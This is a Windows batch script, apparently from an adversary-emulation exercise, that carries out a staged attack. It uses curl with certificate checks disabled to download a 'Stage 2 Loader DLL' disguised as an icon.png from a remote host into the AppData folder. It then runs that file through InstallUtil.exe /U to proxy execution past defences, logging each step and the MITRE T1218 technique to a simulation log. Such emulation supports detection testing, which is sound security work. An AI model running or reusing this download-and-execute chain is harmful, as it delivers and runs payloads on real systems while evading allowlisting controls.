@echo off
setlocal enabledelayedexpansion

REM Placeholder constant declarations (random-named SET vars, one per PHR_*)
SET xYz9kLmN=%APPDATA%\11525\e6904b08
SET pQrStUv1=fd213d0a.txt
SET bCdEfGhI=https://10.0.0.49/stage/2/icon.png?11525-7
SET jKlMnOpq=ITZEL-S2B
SET rStUvWxY=11525
SET zAbCdEfG=7
SET hIjKlMnO=%PUBLIC%\\macula-simulations.log
SET pQrStUv2=https://10.0.0.49

REM Cache timestamp for debug logs
SET tsvar=!DATE!/!TIME!

REM Step 1: Heartbeat fetch - download Stage 2 Loader DLL
echo [!tsvar!][DEBUG][!jKlMnOpq!][!rStUvWxY!]: heartbeat_start>> "!hIjKlMnO!" 2>nul
curl -k -s -o "!xYz9kLmN!\!pQrStUv1!" "!bCdEfGhI!"
set curl_exit=!errorlevel!
echo [!tsvar!][DEBUG][!jKlMnOpq!][!rStUvWxY!]: heartbeat_complete=!curl_exit!>> "!hIjKlMnO!" 2>nul

REM Step 2: Position working directory
echo [!tsvar!][DEBUG][!jKlMnOpq!][!rStUvWxY!]: chdir_start>> "!hIjKlMnO!" 2>nul
cd /d "!xYz9kLmN!" >nul 2>&1
set chdir_exit=!errorlevel!
echo [!tsvar!][DEBUG][!jKlMnOpq!][!rStUvWxY!]: chdir_result=!chdir_exit!>> "!hIjKlMnO!" 2>nul

REM Step 3: LOLBIN invocation via InstallUtil /U
echo [!tsvar!][DEBUG][!jKlMnOpq!][!rStUvWxY!]: installutil_start>> "!hIjKlMnO!" 2>nul
%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U "!pQrStUv1!" >NUL 2>&1
set installutil_exit=!errorlevel!
echo [!tsvar!][DEBUG][!jKlMnOpq!][!rStUvWxY!]: installutil_complete=!installutil_exit!>> "!hIjKlMnO!" 2>nul

REM Determine result for TTP logging
if !installutil_exit! equ 0 (
    set result=OK
    set error_text=
) else (
    set result=FAIL
    set error_text=InstallUtil_ExitCode_!installutil_exit!
)

REM Generate formatted timestamp for TTP log
for /f "delims=" %%t in ('powershell -nop -c "Get-Date -Format 'yyyy-MM-dd HH:mm:ss.fff'"') do set timestamp=%%t

REM Emit TTP log line
echo [!timestamp!][TTP][!jKlMnOpq!][!rStUvWxY!]: T1218^|System Binary Proxy Execution=[!result!]:[!error_text!]>> "!hIjKlMnO!" 2>&1

endlocal